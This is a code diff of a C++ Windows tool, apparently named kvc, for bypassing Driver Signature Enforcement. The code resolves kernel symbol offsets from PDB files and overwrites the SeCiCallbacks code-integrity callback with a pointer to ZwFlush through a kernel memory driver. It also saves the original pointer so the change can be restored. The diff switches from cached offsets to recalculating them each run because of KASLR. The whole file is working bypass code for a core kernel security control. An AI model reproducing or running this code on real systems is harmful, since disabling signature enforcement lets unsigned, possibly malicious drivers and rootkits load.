@@ -1,6 +1,6 @@
 // DSEBypassNG.cpp
 // Next-Generation DSE Bypass using SeCiCallbacks manipulation
-// Memory-only symbol resolution with LCUVer tracking and state management
+// Always calculates fresh offsets on each run to handle KASLR properly
 // Author: Marek Wesolowski, 2025
 
 #include "DSEBypassNG.h"
@@ -30,105 +30,39 @@ DSEBypassNG::DSEBypassNG(std::unique_ptr<kvc>& driver)
 bool DSEBypassNG::DisableDSE() noexcept {
     INFO(L"[DSE-NG] Starting Next-Gen DSE Bypass (Safe Mode)...");
     
-    // 1. Get current LCUVersion for cache validation
+    // Get current LCUVersion for logging only
     std::wstring currentLCUVer = GetCurrentLCUVersion();
-    if (currentLCUVer.empty()) {
-        INFO(L"[DSE-NG] Could not determine LCUVersion, cache disabled");
-    } else {
-        DEBUG(L"[DSE-NG] Current LCUVersion: %s", currentLCUVer.c_str());
+    if (!currentLCUVer.empty()) {
+        INFO(L"[DSE-NG] Current LCUVersion: %s", currentLCUVer.c_str());
     }
     
-    // 2. Check if we have valid cached offsets
-    auto cachedOffsets = GetCachedOffsets();
-    if (cachedOffsets.has_value()) {
-        auto [offSeCi, offZwFlush, kernelBase] = *cachedOffsets;
-        
-        if (ValidateOffsets(offSeCi, offZwFlush, kernelBase)) {
-            INFO(L"[DSE-NG] Using cached offsets (LCUVer: %s)", currentLCUVer.c_str());
-            
-            // Calculate addresses
-            DWORD64 seciBase = kernelBase + offSeCi;
-            DWORD64 targetAddress = seciBase + CALLBACK_OFFSET;
-            DWORD64 safeFunction = kernelBase + offZwFlush;
-            
-            DEBUG(L"[DSE-NG] Kernel base: 0x%llX", kernelBase);
-            DEBUG(L"[DSE-NG] SeCi offset: 0x%llX", offSeCi);
-            DEBUG(L"[DSE-NG] ZwFlush offset: 0x%llX", offZwFlush);
-            DEBUG(L"[DSE-NG] SeCiCallbacks base: 0x%llX", seciBase);
-            DEBUG(L"[DSE-NG] Target address: 0x%llX", targetAddress);
-            DEBUG(L"[DSE-NG] Safe function: 0x%llX", safeFunction);
-            
-            // Read current callback value
-            auto current = m_driver->Read64(targetAddress);
-            if (!current) {
-                ERROR(L"[DSE-NG] Failed to read current kernel callback at 0x%llX", targetAddress);
-                ERROR(L"[DSE-NG] Possible causes: Invalid address, driver not loaded, or memory protected");
-                return false;
-            }
-            
-            DEBUG(L"[DSE-NG] Current callback value: 0x%llX", *current);
-            
-            // Check if already patched
-            if (*current == safeFunction) {
-                // Already patched - check if we have original saved
-                auto savedOriginal = SessionManager::GetOriginalCiCallback();
-                if (savedOriginal == 0) {
-                    // Save the current value (which is the patched value)
-                    // This is unusual but ensures we have something to restore to
-                    SessionManager::SaveOriginalCiCallback(*current);
-                    DEBUG(L"[DSE-NG] Saved current callback (already patched): 0x%llX", *current);
-                }
-                
-                SUCCESS(L"[DSE-NG] DSE is already disabled (Safe Mode)");
-                SUCCESS(L"[DSE-NG] State: PATCHED (ZwFlush callback active)");
-                return true;
-            }
-            
-            // Validate kernel function pointer range
-            if (*current < 0xFFFFF80000000000ULL) {
-                ERROR(L"[DSE-NG] Current value doesn't appear to be a valid kernel function address");
-                ERROR(L"[DSE-NG] Value: 0x%llX (expected ≥ 0xFFFFF80000000000)", *current);
-                ERROR(L"[DSE-NG] Target address calculation may be incorrect");
-                return false;
-            }
-            
-            // Check if this matches a previously saved original
-            auto savedOriginal = SessionManager::GetOriginalCiCallback();
-            if (savedOriginal != 0 && *current == savedOriginal) {
-                INFO(L"[DSE-NG] Current callback matches saved original");
-                INFO(L"[DSE-NG] State: NORMAL (DSE enabled)");
-                INFO(L"[DSE-NG] Proceeding with patch...");
-            }
-            
-            // Save original callback before patching
-            SessionManager::SaveOriginalCiCallback(*current);
-            DEBUG(L"[DSE-NG] Saved original callback: 0x%llX", *current);
-            
-            // Apply patch
-            return ApplyPatch(targetAddress, safeFunction, *current);
-        } else {
-            INFO(L"[DSE-NG] Cached offsets are invalid, recalculating...");
-            SessionManager::ClearDSENGOffsets();
-        }
-    }
-    
-    // 3. Calculate new offsets (cache miss or invalid)
-    INFO(L"[DSE-NG] Calculating new symbol offsets...");
-    auto newOffsets = CalculateNewOffsets();
-    if (!newOffsets) {
-        ERROR(L"[DSE-NG] Failed to calculate symbol offsets");
+    // Get current kernel base (changes every reboot due to KASLR)
+    auto kernelInfo = GetKernelInfo();
+    if (!kernelInfo) {
+        ERROR(L"[DSE-NG] Failed to get kernel information");
         return false;
     }
     
-    auto [offSeCi, offZwFlush, kernelBase] = *newOffsets;
+    auto [kernelBase, kernelPath] = *kernelInfo;
+    INFO(L"[DSE-NG] Current Kernel Base: 0x%llX", kernelBase);
     
-    // 4. Cache the new offsets with LCUVersion
-    if (!currentLCUVer.empty()) {
-        SessionManager::SaveDSENGOffsets(offSeCi, offZwFlush, kernelBase, currentLCUVer);
-        DEBUG(L"[DSE-NG] Cached new offsets with LCUVer: %s", currentLCUVer.c_str());
+    // Get symbol offsets from local PDB or download
+    INFO(L"[DSE-NG] Resolving symbols from PDB...");
+    auto offsets = m_symbolEngine.GetSymbolOffsets(kernelPath);
+    if (!offsets) {
+        ERROR(L"[DSE-NG] Failed to get symbol offsets");
+        return false;
     }
     
-    // 5. Calculate addresses and apply patch
+    auto [offSeCi, offZwFlush] = *offsets;
+    
+    // Validate offsets
+    if (!ValidateOffsets(offSeCi, offZwFlush, kernelBase)) {
+        ERROR(L"[DSE-NG] Offset validation failed");
+        return false;
+    }
+    
+    // Calculate addresses using current kernel base
     DWORD64 seciBase = kernelBase + offSeCi;
     DWORD64 targetAddress = seciBase + CALLBACK_OFFSET;
     DWORD64 safeFunction = kernelBase + offZwFlush;
@@ -140,21 +74,22 @@ bool DSEBypassNG::DisableDSE() noexcept {
     DEBUG(L"[DSE-NG] Target address: 0x%llX", targetAddress);
     DEBUG(L"[DSE-NG] Safe function: 0x%llX", safeFunction);
     
-    // Read current callback
+    // Read current callback value
     auto current = m_driver->Read64(targetAddress);
     if (!current) {
         ERROR(L"[DSE-NG] Failed to read current kernel callback at 0x%llX", targetAddress);
-        ERROR(L"[DSE-NG] Newly calculated address may be incorrect");
+        ERROR(L"[DSE-NG] Possible causes: Invalid address, driver not loaded, or memory protected");
         return false;
     }
     
-    DEBUG(L"[DSE-NG] Current callback value at 0x%llX: 0x%llX", targetAddress, *current);
+    DEBUG(L"[DSE-NG] Current callback value: 0x%llX", *current);
     
     // Check if already patched
     if (*current == safeFunction) {
-        // Already patched - ensure we have original saved
+        // Already patched - check if we have original saved
         auto savedOriginal = SessionManager::GetOriginalCiCallback();
         if (savedOriginal == 0) {
+            // Save the current value (which is the patched value)
             SessionManager::SaveOriginalCiCallback(*current);
             DEBUG(L"[DSE-NG] Saved current callback (already patched): 0x%llX", *current);
         }
@@ -164,30 +99,25 @@ bool DSEBypassNG::DisableDSE() noexcept {
         return true;
     }
     
-    // Validate kernel function pointer
+    // Validate kernel function pointer range
     if (*current < 0xFFFFF80000000000ULL) {
-        ERROR(L"[DSE-NG] Invalid kernel function address read");
-        ERROR(L"[DSE-NG] Address 0x%llX contains value 0x%llX (not a kernel function)", targetAddress, *current);
-        ERROR(L"[DSE-NG] This indicates either:");
-        ERROR(L"[DSE-NG] 1. Wrong offset calculation (check PDB data)");
-        ERROR(L"[DSE-NG] 2. Different Windows version than PDB expects");
-        ERROR(L"[DSE-NG] 3. Memory protection preventing read");
-        
-        // Debug: read memory around target
-        DEBUG(L"[DSE-NG] Reading memory around target address for debugging:");
-        for (int i = -0x20; i <= 0x20; i += 0x8) {
-            auto neighbor = m_driver->Read64(targetAddress + i);
-            if (neighbor) {
-                DEBUG(L"[DSE-NG]   [%+03d] 0x%llX: 0x%llX", i, targetAddress + i, *neighbor);
-            }
-        }
-        
+        ERROR(L"[DSE-NG] Current value doesn't appear to be a valid kernel function address");
+        ERROR(L"[DSE-NG] Value: 0x%llX (expected ≥ 0xFFFFF80000000000)", *current);
+        ERROR(L"[DSE-NG] Target address calculation may be incorrect");
         return false;
     }
     
-    // Save original callback
+    // Check if this matches a previously saved original
+    auto savedOriginal = SessionManager::GetOriginalCiCallback();
+    if (savedOriginal != 0 && *current == savedOriginal) {
+        INFO(L"[DSE-NG] Current callback matches saved original");
+        INFO(L"[DSE-NG] State: NORMAL (DSE enabled)");
+        INFO(L"[DSE-NG] Proceeding with patch...");
+    }
+    
+    // Save original callback before patching
     SessionManager::SaveOriginalCiCallback(*current);
-    DEBUG(L"[DSE-NG] Saved original callback for restoration: 0x%llX", *current);
+    DEBUG(L"[DSE-NG] Saved original callback: 0x%llX", *current);
     
     // Apply patch
     return ApplyPatch(targetAddress, safeFunction, *current);
@@ -196,29 +126,37 @@ bool DSEBypassNG::DisableDSE() noexcept {
 bool DSEBypassNG::RestoreDSE() noexcept {
     INFO(L"[DSE-NG] Restoring DSE configuration...");
     
-    // 1. Check LCUVersion - if changed, clear cache
+    // Get current LCUVersion for logging
     std::wstring currentLCUVer = GetCurrentLCUVersion();
-    if (!currentLCUVer.empty() && IsLCUVersionChanged(currentLCUVer)) {
-        INFO(L"[DSE-NG] LCUVersion changed, invalidating cache...");
-        ClearSymbolCache();
-        ERROR(L"[DSE-NG] System updated - cache invalid");
-        ERROR(L"[DSE-NG] Run 'kvc dse off --safe' to recalculate offsets");
+    if (!currentLCUVer.empty()) {
+        INFO(L"[DSE-NG] Current LCUVersion: %s", currentLCUVer.c_str());
+    }
+    
+    // Get current kernel base (changes every reboot due to KASLR)
+    auto kernelInfo = GetKernelInfo();
+    if (!kernelInfo) {
+        ERROR(L"[DSE-NG] Failed to get kernel information");
         return false;
     }
     
-    // 2. Need offsets for verification
-    auto cachedOffsets = GetCachedOffsets();
-    if (!cachedOffsets) {
-        ERROR(L"[DSE-NG] No cached offsets found");
-        ERROR(L"[DSE-NG] Run 'kvc dse off --safe' first to calculate offsets");
+    auto [kernelBase, kernelPath] = *kernelInfo;
+    INFO(L"[DSE-NG] Current Kernel Base: 0x%llX", kernelBase);
+    
+    // Get symbol offsets
+    INFO(L"[DSE-NG] Resolving symbols from PDB...");
+    auto offsets = m_symbolEngine.GetSymbolOffsets(kernelPath);
+    if (!offsets) {
+        ERROR(L"[DSE-NG] Failed to get symbol offsets");
         return false;
     }
     
-    auto [offSeCi, offZwFlush, kernelBase] = *cachedOffsets;
+    auto [offSeCi, offZwFlush] = *offsets;
+    
+    // Calculate addresses
     DWORD64 targetAddress = kernelBase + offSeCi + CALLBACK_OFFSET;
     DWORD64 safeFunction = kernelBase + offZwFlush;
     
-    // 3. Check current state in kernel
+    // Check current state in kernel
     auto current = m_driver->Read64(targetAddress);
     if (!current) {
         ERROR(L"[DSE-NG] Failed to read kernel callback at 0x%llX", targetAddress);
@@ -228,7 +166,7 @@ bool DSEBypassNG::RestoreDSE() noexcept {
     DEBUG(L"[DSE-NG] Current value at 0x%llX: 0x%llX", targetAddress, *current);
     DEBUG(L"[DSE-NG] Safe function (ZwFlush): 0x%llX", safeFunction);
     
-    // 4. Check if already patched (DSE disabled)
+    // Check if already patched (DSE disabled)
     if (*current == safeFunction) {
         // DSE is disabled - check if we have original callback
         auto original = SessionManager::GetOriginalCiCallback();
@@ -245,7 +183,7 @@ bool DSEBypassNG::RestoreDSE() noexcept {
         }
     }
     
-    // 5. Check if already restored (or never was patched)
+    // Check if already restored (or never was patched)
     auto original = SessionManager::GetOriginalCiCallback();
     if (original != 0 && *current == original) {
         SUCCESS(L"[DSE-NG] DSE is already RESTORED");
@@ -254,25 +192,22 @@ bool DSEBypassNG::RestoreDSE() noexcept {
         return true;
     }
     
-    // 6. If we don't have original and value is not safeFunction
+    // If we don't have original and value is not safeFunction
     if (original == 0 && *current != safeFunction) {
         INFO(L"[DSE-NG] DSE appears to be in NORMAL state");
         INFO(L"[DSE-NG] No patch detected, no saved state");
         INFO(L"[DSE-NG] State: NORMAL (or unknown, no cache)");
-        
-        // Could check g_CiOptions here for certainty
-        // For now, assume normal state
         return true;
     }
     
-    // 7. If we don't have original and value IS safeFunction
+    // If we don't have original and value IS safeFunction
     if (original == 0 && *current == safeFunction) {
         ERROR(L"[DSE-NG] DSE is DISABLED but no original callback saved");
         ERROR(L"[DSE-NG] State: PATCHED (cannot restore - no saved state)");
         return false;
     }
     
-    // 8. Normal restoration (have original, current != original)
+    // Normal restoration (have original, current != original)
     INFO(L"[DSE-NG] Current state: PATCHED");
     INFO(L"[DSE-NG] Current callback: 0x%llX (ZwFlush)", *current);
     INFO(L"[DSE-NG] Restoring to original: 0x%llX", original);
@@ -280,7 +215,7 @@ bool DSEBypassNG::RestoreDSE() noexcept {
     if (RestorePatch(targetAddress, original)) {
         SUCCESS(L"[DSE-NG] DSE RESTORED successfully");
         SUCCESS(L"[DSE-NG] State changed: PATCHED -> NORMAL");
-        // DO NOT clear original - keep it for future use
+        // Keep original callback in registry for future use
         DEBUG(L"[DSE-NG] Original callback kept in registry for future operations");
         return true;
     }
@@ -290,11 +225,9 @@ bool DSEBypassNG::RestoreDSE() noexcept {
 }
 
 bool DSEBypassNG::ClearSymbolCache() noexcept {
-    INFO(L"[DSE-NG] Clearing symbol cache...");
-    SessionManager::ClearDSENGOffsets();
+    INFO(L"[DSE-NG] Clearing saved state...");
     SessionManager::ClearOriginalCiCallback();
-    SUCCESS(L"[DSE-NG] Symbol cache cleared");
-    INFO(L"[DSE-NG] Note: DSE cannot be restored until 'kvc dse off --safe' is run again");
+    SUCCESS(L"[DSE-NG] Saved state cleared");
     return true;
 }
 
@@ -306,18 +239,6 @@ std::wstring DSEBypassNG::GetCacheStatus() noexcept {
         status = L"LCUVersion: Unknown";
     } else {
         status = L"LCUVersion: " + lcuVer;
-    }
-    
-    // Check if we have cached offsets
-    auto cachedOffsets = GetCachedOffsets();
-    if (cachedOffsets.has_value()) {
-        auto [offSeCi, offZwFlush, kernelBase] = *cachedOffsets;
-        status += L"\nCached offsets: Yes";
-        status += L"\nSeCi offset: 0x" + std::to_wstring(offSeCi);
-        status += L"\nZwFlush offset: 0x" + std::to_wstring(offZwFlush);
-        status += L"\nKernel base: 0x" + std::to_wstring(kernelBase);
-    } else {
-        status += L"\nCached offsets: No";
     }
     
     // Check original callback
@@ -332,12 +253,22 @@ std::wstring DSEBypassNG::GetCacheStatus() noexcept {
 }
 
 DSEBypassNG::DSEState DSEBypassNG::CheckDSEState() noexcept {
-    auto cachedOffsets = GetCachedOffsets();
-    if (!cachedOffsets) {
+    // Get current kernel info
+    auto kernelInfo = GetKernelInfo();
+    if (!kernelInfo) {
         return DSEState::UNKNOWN;
     }
     
-    auto [offSeCi, offZwFlush, kernelBase] = *cachedOffsets;
+    auto [kernelBase, kernelPath] = *kernelInfo;
+    
+    // Get offsets
+    auto offsets = m_symbolEngine.GetSymbolOffsets(kernelPath);
+    if (!offsets) {
+        return DSEState::UNKNOWN;
+    }
+    
+    auto [offSeCi, offZwFlush] = *offsets;
+    
     DWORD64 targetAddress = kernelBase + offSeCi + CALLBACK_OFFSET;
     DWORD64 safeFunction = kernelBase + offZwFlush;
     
@@ -428,95 +359,6 @@ std::wstring DSEBypassNG::GetCurrentLCUVersion() noexcept {
     }
     
     return lcuVer;
-}
-
-bool DSEBypassNG::IsLCUVersionChanged(const std::wstring& currentLCUVer) noexcept {
-    HKEY hKey;
-    std::wstring cachedLCUVer;
-    
-    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\kvc\\DSE", 0, 
-        KEY_READ, &hKey) == ERROR_SUCCESS) {
-        wchar_t buffer[256] = {0};
-        DWORD size = sizeof(buffer);
-        
-        if (RegQueryValueExW(hKey, L"LCUVersion", nullptr, nullptr,
-            reinterpret_cast<BYTE*>(buffer), &size) == ERROR_SUCCESS) {
-            cachedLCUVer = buffer;
-        }
-        RegCloseKey(hKey);
-    }
-    
-    // If no cached version, treat as changed (first run)
-    if (cachedLCUVer.empty()) {
-        DEBUG(L"[DSE-NG] No cached LCUVersion found");
-        return true;
-    }
-    
-    bool changed = (cachedLCUVer != currentLCUVer);
-    if (changed) {
-        DEBUG(L"[DSE-NG] LCUVersion changed: cached=%s, current=%s", 
-              cachedLCUVer.c_str(), currentLCUVer.c_str());
-    }
-    
-    return changed;
-}
-
-std::optional<std::tuple<DWORD64, DWORD64, DWORD64>> DSEBypassNG::GetCachedOffsets() noexcept {
-    std::wstring currentLCUVer = GetCurrentLCUVersion();
-    
-    if (currentLCUVer.empty()) {
-        DEBUG(L"[DSE-NG] No LCUVersion available, skipping cache");
-        return std::nullopt;
-    }
-    
-    // Verify LCUVersion hasn't changed
-    if (IsLCUVersionChanged(currentLCUVer)) {
-        DEBUG(L"[DSE-NG] LCUVersion changed, invalidating cache");
-        return std::nullopt;
-    }
-    
-    // Get offsets from SessionManager (which includes LCUVer check)
-    auto offsets = SessionManager::GetDSENGOffsets(currentLCUVer);
-    if (!offsets.has_value()) {
-        DEBUG(L"[DSE-NG] No valid cached offsets found");
-        return std::nullopt;
-    }
-    
-    DEBUG(L"[DSE-NG] Using cached offsets (LCUVer: %s)", currentLCUVer.c_str());
-    return offsets;
-}
-
-std::optional<std::tuple<DWORD64, DWORD64, DWORD64>> DSEBypassNG::CalculateNewOffsets() noexcept {
-    INFO(L"[DSE-NG] Downloading and processing symbols...");
-    
-    auto kernelInfo = GetKernelInfo();
-    if (!kernelInfo) {
-        ERROR(L"[DSE-NG] Failed to get kernel information");
-        return std::nullopt;
-    }
-    
-    auto [kernelBase, kernelPath] = *kernelInfo;
-    
-    // Use SymbolEngine to get offsets
-    auto offsets = m_symbolEngine.GetSymbolOffsets(kernelPath);
-    if (!offsets) {
-        ERROR(L"[DSE-NG] Failed to get symbol offsets from SymbolEngine");
-        return std::nullopt;
-    }
-    
-    auto [offSeCi, offZwFlush] = *offsets;
-    
-    // Validate offsets
-    if (!ValidateOffsets(offSeCi, offZwFlush, kernelBase)) {
-        ERROR(L"[DSE-NG] Calculated offsets failed validation");
-        return std::nullopt;
-    }
-    
-    SUCCESS(L"[DSE-NG] Symbols processed successfully");
-    DEBUG(L"[DSE-NG] Offsets: SeCi=0x%llX, ZwFlush=0x%llX, Base=0x%llX", 
-          offSeCi, offZwFlush, kernelBase);
-    
-    return std::make_tuple(offSeCi, offZwFlush, kernelBase);
 }
 
 bool DSEBypassNG::ApplyPatch(DWORD64 targetAddress, DWORD64 safeFunction, DWORD64 originalCallback) noexcept {
